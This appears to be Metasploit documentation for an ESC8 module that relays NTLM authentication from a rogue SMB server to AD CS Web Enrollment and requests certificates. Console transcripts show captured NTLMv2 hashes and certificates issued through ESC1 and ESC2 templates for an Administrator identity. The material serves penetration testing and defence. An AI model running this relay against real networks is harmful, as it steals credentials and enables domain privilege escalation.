## Vulnerable Application
This module creates an SMB server and then relays the credentials passed to it
to an HTTP server to gain an authenticated connection.  Once that connection is
established, the module makes an authenticated request for a certificate based
on a given template.

## Verification Steps

1. Install and configure the application
    * See https://docs.metasploit.com/docs/pentesting/active-directory/ad-certificates/overview.html#setting-up-a-esc8-vulnerable-host
2. Start `msfconsole`
2. Do: `use auxiliary/server/relay/esc8`
3. Set the `RHOSTS` option to the AD CS Web Enrollment server
4. Run the module and wait for a request to be relayed

## Options

### MODE
The issue mode. This controls what the module will do once an authenticated session is established to the Web Enrollment
server. Must be one of the following options:

* ALL: Enumerate all available certificate templates and then issue each of them
* AUTO: Automatically select either the `User` or `DomainController` and `Machine` (`Computer`) templates to issue
  based on if the authenticated user is a user or machine account. The determination is based on checking for a `$` 
  at the end of the name, which means that it is a machine account.
* QUERY_ONLY: Enumerate all available certificate templates but do not issue any.  Not all certificate templates
  available for use will be displayed; templates with the flag CT_FLAG_MACHINE_TYPE set will not show available and 
  include `Machine` (AKA `Computer`) and `DomainController`  
* SPECIFIC_TEMPLATE: Issue the certificate template specified in the `CERT_TEMPLATE` option

### CERT_TEMPLATE
The template to issue if MODE is SPECIFIC_TEMPLATE.

## Scenarios

### NTLM

```
msf auxiliary(server/relay/esc8) > show options

Module options (auxiliary/server/relay/esc8):

   Name           Current Setting            Required  Description
   ----           ---------------            --------  -----------
   ALT_DNS                                   no        Alternative certificate DNS
   ALT_SID                                   no        Alternative object SID
   ALT_UPN        Administrator@example.com  no        Alternative certificate UPN (format: USER@DOMAIN)
   CAINPWFILE                                no        Name of file to store Cain&Abel hashes in. Only supports NTLMv1 hashes. Can
                                                       be a path.
   JOHNPWFILE                                no        Name of file to store JohnTheRipper hashes in. Supports NTLMv1 and NTLMv2 ha
                                                       shes, each of which is stored in separate files. Can also be a path.
   MODE           SPECIFIC_TEMPLATE          yes       The issue mode. (Accepted: ALL, AUTO, QUERY_ONLY, SPECIFIC_TEMPLATE)
   ON_BEHALF_OF                              no        Username to request on behalf of (format: DOMAIN\USER)
   PFX                                       no        Certificate to request on behalf of
   Proxies                                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported prox
                                                       ies: socks5h, sapni, socks4, http, socks5
   RELAY_TIMEOUT  25                         yes       Seconds that the relay socket will wait for a response after the client has
                                                       initiated communication.
   RHOSTS         10.5.132.180               yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba
                                                       sics/using-metasploit.html
   RPORT          80                         yes       The target port (TCP)
   SMBDomain      WORKGROUP                  yes       The domain name used during SMB exchange.
   SRVHOST        0.0.0.0                    yes       The local host or network interface to listen on. This must be an address on
                                                        the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT        445                        yes       The local port to listen on.
   SRV_TIMEOUT    25                         yes       Seconds that the server socket will wait for a response after the client has
                                                        initiated communication.
   SSL            false                      no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /certsrv/                  yes       The URI for the cert server.
   VHOST                                     no        HTTP server virtual host


   When MODE is SPECIFIC_TEMPLATE:

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   CERT_TEMPLATE  ESC1-Template    no        The template to issue if MODE is SPECIFIC_TEMPLATE.


Auxiliary action:

   Name   Description
   ----   -----------
   Relay  Run SMB ESC8 relay server



View the full module info with the info, or info -d command.

msf auxiliary(server/relay/esc8) > run
[*] Auxiliary module running as background job 1.
msf auxiliary(server/relay/esc8) > 
[*] SMB Server is running. Listening on 0.0.0.0:445
[*] Server started.
[*] New request from 192.168.159.129
[*] Received request for MSFLAB\smcintyre
[*] Relaying to next target http://192.168.159.10:80/certsrv/
[+] Identity: MSFLAB\smcintyre - Successfully authenticated against relay target http://192.168.159.10:80/certsrv/
[SMB] NTLMv2-SSP Client     : 192.168.159.10
[SMB] NTLMv2-SSP Username   : MSFLAB\smcintyre
[SMB] NTLMv2-SSP Hash       : smcintyre::MSFLAB:821ad4c6b40475f4:07a6e0fd89d9af86a5b0e12d24915b4d:010100000000000071fe99aa0a27db01eabcbc6e8fcb6ed20000000002000c004d00530046004c00410042000100040044004300040018006d00730066006c00610062002e006c006f00630061006c0003001e00440043002e006d00730066006c00610062002e006c006f00630061006c00050018006d00730066006c00610062002e006c006f00630061006c000700080071fe99aa0a27db01060004000200000008003000300000000000000001000000002000004206ecc9e398d7766166f0f45d8bdcf7708c8f278f2cff1cc58017f9acf0f5400a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100350039002e003100320038000000000000000000

[*] Creating certificate request for MSFLAB\smcintyre using the User template
[*] Generating CSR...
[*] CSR Generated
[*] Requesting relay target generate certificate...
[+] Certificate generated using template User and MSFLAB\smcintyre
[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=184&
[+] Certificate for MSFLAB\smcintyre using template User saved to /home/smcintyre/.msf4/loot/20241025142116_default_192.168.159.10_windows.ad.cs_995918.pfx
[*] Relay tasks complete; waiting for next login attempt.
[*] Received request for MSFLAB\smcintyre
[*] Identity: MSFLAB\smcintyre - All targets relayed to
[*] New request from 192.168.159.129
[*] Received request for MSFLAB\smcintyre
[*] Identity: MSFLAB\smcintyre - All targets relayed to
```


### NTLM and ESC1

```
msf auxiliary(server/relay/esc8) > show options

Module options (auxiliary/server/relay/esc8):

   Name           Current Setting            Required  Description
   ----           ---------------            --------  -----------
   ALT_DNS                                   no        Alternative certificate DNS
   ALT_SID                                   no        Alternative object SID
   ALT_UPN        Administrator@example.com  no        Alternative certificate UPN (format: USER@DOMAIN)
   CAINPWFILE                                no        Name of file to store Cain&Abel hashes in. Only supports NTLMv1 hashes. Can
                                                       be a path.
   JOHNPWFILE                                no        Name of file to store JohnTheRipper hashes in. Supports NTLMv1 and NTLMv2 ha
                                                       shes, each of which is stored in separate files. Can also be a path.
   MODE           SPECIFIC_TEMPLATE          yes       The issue mode. (Accepted: ALL, AUTO, QUERY_ONLY, SPECIFIC_TEMPLATE)
   ON_BEHALF_OF                              no        Username to request on behalf of (format: DOMAIN\USER)
   PFX                                       no        Certificate to request on behalf of
   Proxies                                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported prox
                                                       ies: socks5h, sapni, socks4, http, socks5
   RELAY_TIMEOUT  25                         yes       Seconds that the relay socket will wait for a response after the client has
                                                       initiated communication.
   RHOSTS         10.5.132.180               yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba
                                                       sics/using-metasploit.html
   RPORT          80                         yes       The target port (TCP)
   SMBDomain      WORKGROUP                  yes       The domain name used during SMB exchange.
   SRVHOST        0.0.0.0                    yes       The local host or network interface to listen on. This must be an address on
                                                        the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT        445                        yes       The local port to listen on.
   SRV_TIMEOUT    25                         yes       Seconds that the server socket will wait for a response after the client has
                                                        initiated communication.
   SSL            false                      no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /certsrv/                  yes       The URI for the cert server.
   VHOST                                     no        HTTP server virtual host


   When MODE is SPECIFIC_TEMPLATE:

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   CERT_TEMPLATE  ESC1-Template    no        The template to issue if MODE is SPECIFIC_TEMPLATE.


Auxiliary action:

   Name   Description
   ----   -----------
   Relay  Run SMB ESC8 relay server



View the full module info with the info, or info -d command.

msf auxiliary(server/relay/esc8) > run
[*] Auxiliary module running as background job 0.
msf auxiliary(server/relay/esc8) > 
[*] SMB Server is running. Listening on 0.0.0.0:445
[*] Server started.
[*] New request from 10.5.132.122
[*] Received request for \msfuser
[*] Relaying to next target http://10.5.132.180:80/certsrv/
[+] Identity: \msfuser - Successfully authenticated against relay target http://10.5.132.180:80/certsrv/
[SMB] NTLMv2-SSP Client     : 10.5.132.180
[SMB] NTLMv2-SSP Username   : \msfuser
[SMB] NTLMv2-SSP Hash       : msfuser:::af0b69bf0b95c55e:db5ce84b2f41b82d7df93bd2566c06b6:0101000000000000cbf836e63587dc013ce37255fbca75410000000002000e004500580041004d0050004c00450001001e00570049004e002d00440052004300390048004300440049004d0041005400040016006500780061006d0070006c0065002e0063006f006d0003003600570049004e002d00440052004300390048004300440049004d00410054002e006500780061006d0070006c0065002e0063006f006d00050016006500780061006d0070006c0065002e0063006f006d0007000800cbf836e63587dc01060004000200000008003000300000000000000000000000003000002ad3656a59fe53f773d5bc3852373338e1f3270cdbdf9411b84ef184151925510a001000000000000000000000000000000000000900220063006900660073002f00310030002e0035002e003100330035002e003200300031000000000000000000

[+] Certificate generated using template ESC1-Template and \msfuser
[+] Certificate for \msfuser using template ESC1-Template saved to /home/tmoose/.msf4/loot/20260116161729_default_10.5.132.180_windows.ad.cs_994769.pfx
[*] Received request for \msfuser
[*] Identity: \msfuser - All targets relayed to

```

### NTLM and ESC2
```msf
msf auxiliary(server/relay/esc8) > show options

Module options (auxiliary/server/relay/esc8):

   Name           Current Setting                       Required  Description
   ----           ---------------                       --------  -----------
   ALT_DNS                                              no        Alternative certificate DNS
   ALT_SID                                              no        Alternative object SID
   ALT_UPN                                              no        Alternative certificate UPN (format: USER@DOMAIN)
   CAINPWFILE                                           no        Name of file to store Cain&Abel hashes in. Only supports NTLMv1 h
                                                                  ashes. Can be a path.
   JOHNPWFILE                                           no        Name of file to store JohnTheRipper hashes in. Supports NTLMv1 an
                                                                  d NTLMv2 hashes, each of which is stored in separate files. Can a
                                                                  lso be a path.
   MODE           SPECIFIC_TEMPLATE                     yes       The issue mode. (Accepted: ALL, AUTO, QUERY_ONLY, SPECIFIC_TEMPLA
                                                                  TE)
   ON_BEHALF_OF   EXAMPLE\Administrator                 no        Username to request on behalf of (format: DOMAIN\USER)
   PFX            /home/tmoose/.msf4/loot/202601161509  no        Certificate to request on behalf of
                  11_default_10.5.132.180_windows.ad.c
                  s_854591.pfx
   Proxies                                              no        A proxy chain of format type:host:port[,type:host:port][...]. Sup
                                                                  ported proxies: socks5h, sapni, socks4, http, socks5
   RELAY_TIMEOUT  25                                    yes       Seconds that the relay socket will wait for a response after the
                                                                  client has initiated communication.
   RHOSTS         10.5.132.180                          yes       The target host(s), see https://docs.metasploit.com/docs/using-me
                                                                  tasploit/basics/using-metasploit.html
   RPORT          80                                    yes       The target port (TCP)
   SMBDomain      WORKGROUP                             yes       The domain name used during SMB exchange.
   SRVHOST        0.0.0.0                               yes       The local host or network interface to listen on. This must be an
                                                                   address on the local machine or 0.0.0.0 to listen on all address
                                                                  es.
   SRVPORT        445                                   yes       The local port to listen on.
   SRV_TIMEOUT    25                                    yes       Seconds that the server socket will wait for a response after the
                                                                   client has initiated communication.
   SSL            false                                 no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /certsrv/                             yes       The URI for the cert server.
   VHOST                                                no        HTTP server virtual host


   When MODE is SPECIFIC_TEMPLATE:

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   CERT_TEMPLATE  User             no        The template to issue if MODE is SPECIFIC_TEMPLATE.


Auxiliary action:

   Name   Description
   ----   -----------
   Relay  Run SMB ESC8 relay server



View the full module info with the info, or info -d command.

msf auxiliary(server/relay/esc8) > run
[*] Auxiliary module running as background job 0.
msf auxiliary(server/relay/esc8) > 
[*] SMB Server is running. Listening on 0.0.0.0:445
[*] Server started.
[*] New request from 10.5.132.122
[*] Received request for \msfuser
[*] Relaying to next target http://10.5.132.180:80/certsrv/
[+] Identity: \msfuser - Successfully authenticated against relay target http://10.5.132.180:80/certsrv/
[SMB] NTLMv2-SSP Client     : 10.5.132.180
[SMB] NTLMv2-SSP Username   : \msfuser
[SMB] NTLMv2-SSP Hash       : msfuser:::916940a20e939a34:7f5150c74cba44513fcb2e7ed28e8f45:0101000000000000bf1765b93787dc01c7c75e835e16b4ad0000000002000e004500580041004d0050004c00450001001e00570049004e002d00440052004300390048004300440049004d0041005400040016006500780061006d0070006c0065002e0063006f006d0003003600570049004e002d00440052004300390048004300440049004d00410054002e006500780061006d0070006c0065002e0063006f006d00050016006500780061006d0070006c0065002e0063006f006d0007000800bf1765b93787dc01060004000200000008003000300000000000000000000000003000002ad3656a59fe53f773d5bc3852373338e1f3270cdbdf9411b84ef184151925510a001000000000000000000000000000000000000900220063006900660073002f00310030002e0035002e003100330035002e003200300031000000000000000000

[+] Certificate generated using template User and \msfuser
[+] Certificate for \msfuser using template User saved to /home/tmoose/.msf4/loot/20260116163102_default_10.5.132.180_windows.ad.cs_883392.pfx
[*] Received request for \msfuser
[*] Identity: \msfuser - All targets relayed to


```